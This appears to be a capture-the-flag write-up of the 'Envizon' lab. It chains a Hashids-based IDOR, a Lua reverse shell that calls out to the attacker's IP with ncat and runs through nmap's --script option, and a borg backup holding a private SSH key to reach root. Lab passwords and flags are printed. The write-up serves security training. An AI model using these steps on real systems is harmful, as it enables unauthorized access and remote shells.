> Envizon | Docker

# Source : https://gitlab.com/evait-security/envizon_thm

## Hints Given

1. This is not an empty instance. Imagine that it is/was used and therefore contains user data
2. Currently a note function is under development
3. When looking for code execution on the system, the most obvious way is the best - it is important to understand what the application does.

# Nmap

nmap -sC -sV -T4 -Pn -A -p- -vv -oN nmap/inital envizon.thm

```bash
22/tcp   open  ssh      syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ssl/ppp? syn-ack
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, RPCCheck, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|   GetRequest: 
|     HTTP/1.0 301 Moved Permanently
|     Location: https://localhost/scans
|     Content-Type: text/html
|     Cache-Control: no-cache
|     X-Request-Id: 67255652-c94d-44ad-b9e1-f194d9b2730f
|     X-Runtime: 0.002726
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Content-Length: 89
|     <html><body>You are being <a href="https://localhost/scans">redirected</a>.</body></html>
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     X-Request-Id: 6d70661a-69c8-47ad-9cb6-450854000d34
|     X-Runtime: 0.002001
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Content-Length: 1722
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>The page you were looking for doesn't exist (404)</title>
|     <meta name="viewport" content="width=device-width,initial-scale=1">
|     <style>
|     .rails-default-error-page {
|     background-color: #EFEFEF;
|     color: #2E2F30;
|     text-align: center;
|     font-family: arial, sans-serif;
|     margin: 0;
|     .rails-default-error-page div.dialog {
|     width: 95%;
|     max-width: 33em;
|     margin: 4em auto 0;
|     .rails-default-error-page div.dialog > div {
|     border: 1px solid #CCC;
|     border-right-color: #999;
|     border-left-color: #999;
|     border-bottom-color: #BBB;
|     border-top: #B00100 solid 4px;
|_    border-top-left-radius: 9p
| ssl-cert: Subject: commonName=None/organizationName=evait/stateOrProvinceName=None/countryName=DE/localityName=None
| Issuer: commonName=None/organizationName=evait/stateOrProvinceName=None/countryName=DE/localityName=None
```

Let's start to focus on port 3000. When we access the website in port 3000 we are prompted to signin. Let's run gobuster to find some interesting locations.

# Gobuster

gobuster dir -u https://envizon.thm:3000 -k -q -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o gobuster/initial

```bash
/admin                (Status: 302) [Size: 102] [--> https://envizon.thm:3000/admin/login]
/images               (Status: 302) [Size: 104] [--> https://envizon.thm:3000/users/sign_in]
/issues               (Status: 302) [Size: 104] [--> https://envizon.thm:3000/users/sign_in]
/reports              (Status: 302) [Size: 104] [--> https://envizon.thm:3000/users/sign_in]
/groups               (Status: 302) [Size: 104] [--> https://envizon.thm:3000/users/sign_in]
/clients              (Status: 302) [Size: 104] [--> https://envizon.thm:3000/users/sign_in]
/notes                (Status: 302) [Size: 104] [--> https://envizon.thm:3000/users/sign_in]
/404                  (Status: 200) [Size: 1722]                                            
/500                  (Status: 200) [Size: 1635]                                            
/422                  (Status: 200) [Size: 1705]                                            
/scans                (Status: 302) [Size: 104] [--> https://envizon.thm:3000/users/sign_in]
```

So the 1'st question is to find the password. From the gobuster result we can find what is that notes dir. Since we are white box pentesting here we can actually try and see that location locally.

Looking around we can find a file names `/app/controllers/notes_controller.rb` 

```rb
class NotesController < ApplicationController
  before_action :authenticate_user!, except: %i[show]
  before_action :set_note, only: [:show, :edit, :update, :destroy]

  # GET /notes
  # GET /notes.json
  def index
    @notes = Note.all
  end

  # GET /notes/1
  # GET /notes/1.json
  def show
  end

  # GET /notes/new
  def new
    @note = Note.new
  end

  # GET /notes/1/edit
  def edit
  end
  ...
```

We can observe from the 2nd line that the show function can work without authentication and below we have some comment line for /notes/1. Comming at the end we find something interesting.

```rb
private
  # Use callbacks to share common setup or constraints between actions.
  def set_note
    if params[:id] == "1" # hot fix for old first note //should be removed soon 
      @note = Note.first
    else
      @note = Note.find(params[:id])
    end
  end
```

Looks like the developers implemented additional check in the notes controller for the note with the id “1”. So the very first note can be reached by simply using the id. But other notes can't be accessed due to `acts_as_hashids` gem in `/app/models/notes.rb`

# /app/models/notes.rb

```rb
class Note < ApplicationRecord
    acts_as_hashids length: 30
    # todo: add more security layers, maybe custom secret or implement a pepper
end
```

So, let's try to access `https://envizon.thm:3000/notes/1`. Yes!

```
Text: Hi Paul, for security reasons I added hashids with a length of 30 characters to notes. I stored the password for this envizon instance in the note with id 380 and sent you the link by email. We may should consider to add more security layers to this gem (https://github.com/dtaniwaki/acts_as_hashids) 
```

Looks like we have to exploit using IDOR. But before that we have to calculate hashid for note 380. And looking at `act_as_hashids` source code at github looks like it uses default secret as class name. And from `notes.rb` file we can find that our class name is `Note`. Ok we must have `hashids` gem to work with it!

```rb
irb
require "hashids"
hid = Hashids.new('Note', 30)
hid.encode(380)
"y2a419eKDBLRvEYobWNpw0jnr6xlAX"
```

We got our hash. Let's access it in url. `https://envizon.thm:3000/notes/y2a419eKDBLRvEYobWNpw0jnr6xlAX`

```
Text: Password for envizon: rE8Z*qyM!DTKNP8fGu4T3CtW*aurBQwLF 
```

We got the password now let's login! We are in! Ok now looking around we can upload file and run manual commands. Actually we can run commands with nmap. So let's try manual cmd. But before that let's check for source code of the file. Trying commands from GTFO didn't work. Maybe the command execution have been mitigated. Let's try to write a malicious lua script and execute it using --script option. We have to abuse the upload XML file functionality.

# /app/controllers/scans_controller.rb

```rb
# @url /scans/upload
# @action POST
#
# @required [String] :name name of the scan
# @required [File] :xml_file uploaded file, XML-output of nmap -oX
def upload
  if %i[xml_file name].all? { |key| params[key].present? }
    xmls = params[:xml_file]
    name = params[:name]
    xmls.each_with_index do |xml, index|
      FileUtils.mkdir_p(Rails.root.join('nmap', 'uploads'))
      destination = Rails.root.join('nmap', 'uploads', "#{name}_#{index.to_s}.xml")
      FileUtils.move xml.path, destination
      scan = Scan.new(name: name, user_id: current_user.id)
      scan.command = 'Scan in progress…'
      scan.save
      args_parse = {
        'xmlpath' => destination,
        'scan_id' => scan.id,
        'user_id' => current_user.id
      }
```

So the path where the file'll be uploaded is `/nmap/uploads`. And also no check for the contents of file.

# shell.lua

```lua
os.execute("ncat -e /bin/sh 10.9.12.130 1234")
```

Let's upload the file using `Upload nmap-XML` option. And then in `Tasks -> Retries` we can see that we have the path

```
{"xmlpath"=>"/usr/src/app/envizon/nmap/uploads/test_0.xml", "scan_id"=>46, "user_id"=>1}}
```

Now we have to go to `Manual Scan` and in `Nmap parameter` type `nmap --script /usr/src/app/envizon/nmap/uploads/test_0.xml` and Target as yout machine IP and any name. We got our shell as root! Ofcourse we are in a docker environment.

# /root/local.txt

```
7953ba7f83b3fd00279627de052bc078
```

## Hint: We always backup our stuff

So I tried to look at /var/backup but nothing interesting. Lets' take a look at /etc and /opt. And in /etc we found borgmatic a backup software and we got a `config.yaml` inside.

```yaml
# Where to look for files to backup, and where to store those backups.
# See https://borgbackup.readthedocs.io/en/stable/quickstart.html and
# https://borgbackup.readthedocs.io/en/stable/usage/create.html
# for details.
location:
    # List of source directories to backup (required). Globs and
    # tildes are expanded.
    source_directories:
        - /root

    # Paths to local or remote repositories (required). Tildes are
    # expanded. Multiple repositories are backed up to in
    # sequence. See ssh_command for SSH options like identity file
    # or port.
    repositories:
        - /var/backup

retention:
    # Retention policy for how many backups to keep.
    keep_daily: 7
    keep_weekly: 4
    keep_monthly: 6

storage:
    encryption_passcommand: 'echo 4bikDP8iaCEvgYksIKPUmACEwGYPcnlQ'
```

We got the encryption password and the location of the backups are locally stores. Let's try to get those.

```bash
borgmatic list # List archives

/var/backup: Listing archives
envizon-2020-09-30T23:25:30.466049   Wed, 2020-09-30 23:25:31 [b2aae5e7803b2134e2dc913b10b03430a4b892c3b32dd2f1556175f51e85c8bc]
envizon-2020-09-30T23:26:23.900026   Wed, 2020-09-30 23:26:25 [d027cf90321085f4cf1b1f1883c7287051f8350568ae1ecf421b52fb906f91a3]

borgmatic extract --archive envizon-2020-09-30T23:25:30.466049 # Extract archives
```

We got .ssh in the extracted root folder. And it has an unsecured private ssh key.

Let's transfer it to our system and get it done. 

ssh -i id_rsa root@envizon.thm

```
40963d170c949f8325783c552e150236
```